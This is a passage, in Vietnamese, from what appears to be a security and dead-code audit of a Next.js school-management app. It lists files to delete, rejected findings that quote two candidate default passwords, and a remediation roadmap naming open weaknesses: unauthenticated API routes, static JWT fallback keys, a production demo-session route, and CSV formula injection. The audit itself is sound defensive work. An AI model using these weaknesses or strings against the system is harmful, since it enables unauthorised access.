3. **Staff Focus View cũ:**
   - `src/components/dashboard/roles/staff-focus-view.tsx` (827 LOC).
4. **Hằng số Menu cũ:**
   - `src/components/navigation.tsx` (`NAVIGATION_ITEMS` đang được import trong 3 file test).
5. **Bộ 4 components văn bản cũ:**
   - `document-quick-entry-modal.tsx`, `document-split-view.tsx`, `directive-action-panel.tsx`, `document-pdf-viewer.tsx` (1.886 LOC).

### 3.3. Hướng dẫn quy trình dọn dẹp an toàn (Zero-Downtime Clean-up Rule)
1. **Tuân thủ quy tắc CLAUDE.md:** Tuyệt đối không chạy `npm run build` khi server `npm run dev` đang chạy để tránh nhiễm độc cache `.next/`.
2. **Quy trình 3 bước:**
   - Bước 1: Xóa các file và hàm thuộc Nhóm 1.
   - Bước 2: Chạy `npm run typecheck` (`tsc --noEmit`) để xác thực không có lỗi tham chiếu kiểu.
   - Bước 3: Chạy `npm test` để đảm bảo 100% test suite hiện hành vẫn vượt qua.

---

## 4. CÁC CẢNH BÁO ĐÃ BÁC BỎ (FALSE POSITIVES FILTERED OUT)

Đội ngũ kỹ thuật không cần đầu tư thời gian vào 3 mục sau do đã được thẩm định thực tế là **báo cáo sai lệch**:

| Mã cảnh báo | Nội dung báo cáo sai lệch | Lý do bác bỏ từ kết quả rà soát thực tế |
| :--- | :--- | :--- |
| **VULN-10** | Mật khẩu mặc định dự đoán được khi đăng ký tài khoản (`Qcet@2026`) & Google OAuth (`GoogleAuthNoPassword123!`) | 1. File `src/lib/auth/user-service.ts` **hoàn toàn không tồn tại** trong mã nguồn.<br>2. Chuỗi ký tự `Qcet@2026` và `GoogleAuthNoPassword123!` không hề có trong repository.<br>3. `src/app/api/auth/register/route.ts` bắt buộc mật khẩu `length >= 6`.<br>4. Luồng Google OAuth gán `passwordHash = null`. Hàm `verifyPassword` từ chối hash rỗng nên kẻ tấn công không thể dùng mật khẩu tĩnh để đăng nhập. |
| **VULN-11** | Đăng ký tài khoản tự gán quyền Quản trị (`Self-Assign Role`) | Kiểm tra `src/app/api/auth/register/route.ts`: Dòng 9 chỉ bóc tách các trường họ tên, email, mật khẩu, phòng ban; trường `role` từ body bị loại bỏ hoàn toàn. Dòng 71 gán cứng `role: PrismaUserRole.CHUYEN_VIEN` trên máy chủ. Người dùng đăng ký mới luôn luôn chỉ có quyền Chuyên viên. |
| **AUDITOR-4 #3** | IDOR / Push Spoofing mạo danh Ban Giám hiệu qua API Push Test | Kiểm tra `src/app/api/notifications/push/test/route.ts`: Dòng 53 và 65 chỉ định danh `userId: session.id`. API không nhận `targetUserId` từ client, thông báo chỉ được gửi đến thiết bị của chính người đang đăng nhập. Ngoài ra, trường `linkHref` đã được kiểm tra chỉ cho phép relative link nội bộ. |

---

## 5. LỘ TRÌNH HÀNH ĐỘNG KHUYẾN NGHỊ (ACTIONABLE ROADMAP)

```
[GIAI ĐOẠN 1: VÁ KHẨN CẤP (HOTFIXES TRONG 24H)]
├── 1. Tạo src/middleware.ts bảo vệ tập trung toàn bộ /api/** (Chặn nặc danh đọc documents, tasks, users).
├── 2. Khóa cứng logic directives: chỉ BGH/Admin được ban hành, effectiveLeaderId = session.id.
├── 3. Sửa hàm kiểm tra URL minh chứng tại submit-deliverable-modal & review-action-dialog (Chặn javascript:).
└── 4. Thêm kiểm tra quyền xóa và cập nhật nhiệm vụ tại src/app/api/tasks/[id]/route.ts (Chặn BOLA/BFLA).

[GIAI ĐOẠN 2: TĂNG CƯỜNG PHÒNG VỆ & ACCESS CONTROL (TRONG TUẦN NÀY)]
├── 5. Khắc phục CSV Formula Injection trong excel-export.ts (Thêm dấu nháy đơn ' cho ký tự nhạy cảm).
├── 6. Xóa fallback keys tĩnh trong jwt-session.ts và push-service.ts; bắt buộc throw Error nếu thiếu ENV.
├── 7. Vô hiệu hóa hoặc gỡ bỏ hoàn toàn route /api/auth/demo-session trên môi trường production.
├── 8. Thêm xác thực và mã hóa RFC 6266 cho Content-Disposition tại tuyến tải file (/api/documents/download).
└── 9. Bổ sung HTTP Security Headers (CSP, X-Frame-Options, X-Content-Type-Options) vào next.config.ts.

[GIAI ĐOẠN 3: DỌN DẸP DEAD CODE & TỐI ƯU BUNDLE SIZE (TUẦN KẾ TIẾP)]
├── 10. Xóa an toàn 14 mục Nhóm 1 (CONFIRMED DEAD CODE), cắt giảm ngay ~1.700 LOC.
├── 11. Cập nhật test suite tests/role-based-workspace-workflow.test.ts sang UnifiedAdaptiveWorkspace.
├── 12. Gỡ bỏ thư mục src/components/portal/ legacy và staff-focus-view.tsx (~10.000 LOC).
└── 13. Tích hợp dọn dẹp CacheStorage khi logout trong public/sw.js và auth-context.tsx.
```